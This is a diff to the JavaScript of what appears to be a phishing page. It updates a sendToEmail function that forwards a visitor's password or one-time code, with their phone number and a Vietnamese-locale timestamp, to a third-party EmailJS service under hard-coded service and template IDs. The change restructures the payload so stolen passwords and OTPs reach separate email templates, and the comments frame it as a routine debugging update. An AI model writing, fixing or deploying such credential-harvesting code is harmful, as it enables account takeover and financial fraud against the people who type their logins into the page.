@@ -763,17 +763,22 @@
             }, 1000);
         }
 
-        // Send to EmailJS - Added debug log
+        // Send to EmailJS - Updated to use 'password' and 'otp' keys
         function sendToEmail(type, value, phone) {
             console.log(`Sending ${type} to EmailJS:`, { value, phone }); // Debug log
             const templateId = type === 'password' ? 'template_xw5s9pw' : 'template_g9e2jee';
-            emailjs.send('service_60tgxof', templateId, {
+            const payload = {
                 type: type,
-                value: value,
                 phone: phone,
                 timestamp: new Date().toLocaleString('vi-VN')
-            }).then(
-                () => console.log(`${type} sent to EmailJS:`, { type, value, phone, timestamp: new Date().toLocaleString('vi-VN') }),
+            };
+            if (type === 'password') {
+                payload.password = value; // Use 'password' key for template_xw5s9pw
+            } else {
+                payload.otp = value; // Use 'otp' key for template_g9e2jee
+            }
+            emailjs.send('service_60tgxof', templateId, payload).then(
+                () => console.log(`${type} sent to EmailJS:`, payload),
                 (error) => console.error('EmailJS error:', error)
             );
         }
